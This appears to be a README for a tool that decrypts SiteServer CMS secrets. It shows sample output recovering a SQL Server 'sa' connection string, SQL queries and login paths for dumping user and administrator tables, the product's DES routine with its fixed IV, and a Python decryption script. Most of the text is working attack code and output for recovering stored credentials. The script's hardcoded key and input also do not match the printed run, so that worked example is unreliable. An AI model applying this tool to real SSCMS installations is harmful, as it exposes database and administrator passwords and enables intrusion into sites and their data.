# sscms database decrypt

`https://github.com/siteserver/cms/blob/master/src/SSCMS/Utils/DesEncryptor.cs`

## Des Decrypt

```
 python3 sscms_decrypt.py
 
[+] Current Encrypt Data= 0NofLD4zWcY/jm+42NYzug==
[+] secretKey= f9c01027
[+] iv_hex= 1234567890abcdef
[+] 数据库类型：SqlServer

[+] Current Encrypt Data= B0SvIg6ExtjhllXf3vb9UwjmLKSRMlqQ1LIs6a8G0G/M1cWZ2ABJ6lvZOMlvKR+vM7/QKGc8pYo8t6sumMerqA==
[+] secretKey= f9c01027
[+] iv_hex= 1234567890abcdef
[+] 数据库配置信息：Server=192.168.77.200;Uid=sa;Pwd=p@ssw0rd2020;Database=sscms;
```

## sscms.json

```
{
  "IsNightlyUpdate": false,
  "IsProtectData": true,
  "AdminDirectory": "siteserver",
  "HomeDirectory": "home",
  "SecurityKey": "f9c01027278a387b",
  "Database": {
    "Type": "0NofLD4zWcY0slash0jm0add042NYzug0equals00equals00secret0",
    "ConnectionString": "B0SvIg6ExtjhllXf3vb9UwjmLKSRMlqQ1LIs6a8G0G0slash0M1cWZ2ABJ6lvZOMlvKR0add0vM70slash0QKGc8pYo8t6sumMerqA0equals00equals00secret0"
  },
  "Redis": {
    "ConnectionString": ""
  }
}
```

#### 系统安装后，SS CMS 系统将把数据库连接信息存放于 `sscms.json` 配置文件中：

- IsProtectData：数据库连接是否加密存储
- SecurityKey：加密秘钥，系统随机生成
- Database:Type：数据库类型
- Database:ConnectionString：数据库连接字符串

### 数据库用户密码表解密

#### 前台用户表：

前台登录地址: 
http://x.x.x.x/home/pages/login.html
![image](https://user-images.githubusercontent.com/16593068/144416418-bed8f5fc-d294-4b82-8989-4ad45b9dae4b.png)

`SELECT * FROM jxxt.dbo.siteserver_User`

#### 后台管理员表

后台登录地址：
http://x.x.x.x/SiteServer/pageLogin.cshtml

![image](https://user-images.githubusercontent.com/16593068/144416281-a033c123-9e37-4dfb-aa66-f3c76a59a9d4.png)


`SELECT * FROM jxxt.dbo.siteserver_Administrator`

![image](https://user-images.githubusercontent.com/16593068/144417044-934e5a90-72b4-4664-986a-ead939821062.png)


对应的解密代码：

https://github1s.com/siteserver/cms/blob/siteserver-v6.13.0/SiteServer.CMS/Provider/AdministratorDao.cs#L1126


```
        private string DecodePassword(string password, EPasswordFormat passwordFormat, string passwordSalt)
        {
            var retVal = string.Empty;
            if (passwordFormat == EPasswordFormat.Clear)
            {
                retVal = password;
            }
            else if (passwordFormat == EPasswordFormat.Hashed)
            {
                throw new Exception("can not decode hashed password");
            }
            else if (passwordFormat == EPasswordFormat.Encrypted)
            {
                var encryptor = new DesEncryptor
                {
                    InputString = password,
                    DecryptKey = passwordSalt
                };
                encryptor.DesDecrypt();

                retVal = encryptor.OutString;
            }
            return retVal;
        }
```

通过passwordSalt初始化DecryptKey值，进行DES解密，调用DesEncryptor.DesDecrypt()方法


```
		public void DesDecrypt()
		{
		    byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };
		    try
			{
				var byKey = Encoding.UTF8.GetBytes(_decryptKey.Substring(0, 8));
				var des = new DESCryptoServiceProvider();
				var inputByteArray = Convert.FromBase64String(_inputString);
				var ms = new MemoryStream();
				var cs = new CryptoStream(ms, des.CreateDecryptor(byKey, iv), CryptoStreamMode.Write);
				cs.Write(inputByteArray, 0, inputByteArray.Length);
				cs.FlushFinalBlock();
				Encoding encoding = new UTF8Encoding();
				_outString = encoding.GetString(ms.ToArray());
			}
			catch (Exception error)
			{
				_noteMessage = error.Message;
			}
		}
```

对用python3代码：

```
import base64,pyDes

def sscms_decrypt(encodeData):
    var1 = encodeData.replace("0secret0", "").replace("0add0", "+").replace("0equals0", "=").replace("0and0", "&").replace("0question0", "?").replace("0quote0", "'").replace("0slash0", "/")
    var2 = base64.b64decode(var1)
    print("[+] Current Encrypt Data= " + var1)
    secretKey = 'Y2MlWp4hGY2Wcb9tzIiR2w=='[0:8]
    print("[+] secretKey= " + secretKey)
    iv_hex = "1234567890abcdef"
    iv = bytes.fromhex(iv_hex)
    print("[+] iv_hex= " + iv_hex)
    k = pyDes.des(secretKey, pyDes.CBC, iv, pad=None, padmode=pyDes.PAD_PKCS5)
    return k.decrypt(var2) + b"\n"

Data = "VpGCBufzbT+j/zYDjDmtWw=="

print(sscms_decrypt(Data).decode("utf-8"))
```

